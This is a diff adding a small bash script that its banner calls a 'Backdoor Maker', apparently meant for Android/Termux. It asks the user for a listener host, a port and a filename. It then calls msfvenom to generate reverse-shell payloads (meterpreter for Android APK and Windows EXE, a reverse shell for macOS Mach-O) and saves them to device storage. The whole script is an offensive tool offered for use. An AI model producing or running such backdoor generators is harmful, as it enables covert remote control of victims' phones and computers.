@@ -1,0 +1,77 @@
+#!/bin/bash
+#do you want to recode ? up to you:)
+#codingan saya ccad.. hehehe
+
+#variable
+ex="echo"
+ex1="echo -e"
+r="\033[31m"
+g="\033[32m"
+y="\033[33m"
+c="\033[36m"
+w="\033[37m"
+
+$ex1 $g
+$ex " +---------------------------------------------------+ "
+$ex " | Codename	: Maker				     | "
+$ex " | Author	: ./lolzZ			     | "
+$ex " | Description	: Backdoor Maker          	     | "
+$ex " | Github	: https://www.github.com/wannabeee   | "
+$ex " +---------------------------------------------------+ "
+$ex1 $w
+sleep 0.5
+$ex1 $c" 1].Android " $w"[Extension:Apk]"
+$ex1 $c" 2].Windows " $w"[Extension:Exe]"
+$ex1 $c" 3].macOS   " $w"[Extension:Macho]"
+$ex1 $c" 4].Quit 		"
+$ex1 $w
+read -p " select a number~> " lol
+
+	if [ $lol == 1 ] ; then
+
+$ex -n 'Lhost		:  '
+read Lhost
+$ex -n 'Lport		:  '
+read Lport
+$ex -n 'Output_name	:  '
+read Output_name
+$ex1 $y"Process...."$w
+$ex -e ;  msfvenom -p android/meterpreter/reverse_tcp "Lhost=${Lhost}" "Lport=${Lport}" R> /storage/emulated/0/${Output_name}
+$ex1 $r"Complete!"$w
+
+fi
+
+	if [ $lol == 2 ] ; then
+
+$ex -n 'Lhost           :  '
+read Lhost
+$ex -n 'Lport           :  '
+read Lport
+$ex -n 'Output_name     :  '
+read Output_name
+$ex1 $y"Process...."$w
+$ex -e ;  msfvenom -p windows/meterpreter/reverse_tcp "Lhost=${Lhost}" "Lport=${Lport}" -f exe -o /storage/emulated/0/${Output_name}
+$ex1 $r"Complete!"$w
+
+fi
+
+	if [ $lol == 3 ] ; then
+
+$ex -n 'Lhost           :  '
+read Lhost
+$ex -n 'Lport           :  '
+read Lport
+$ex -n 'Output_name     :  '
+read Output_name
+$ex1 $y"Process...."$w
+$ex -e ; msfvenom -p osx/86/shell_reverse_tcp "Lhost=${Lhost}" "Lport=${Lport}" -f macho -o /storage/emulated/0/${Output_name}
+$ex1 $r"Complete!"$w
+
+fi
+
+	if [ $lol == 4 ] ; then
+
+$ex " Bye_^ "
+$ex1 ; exit
+
+fi
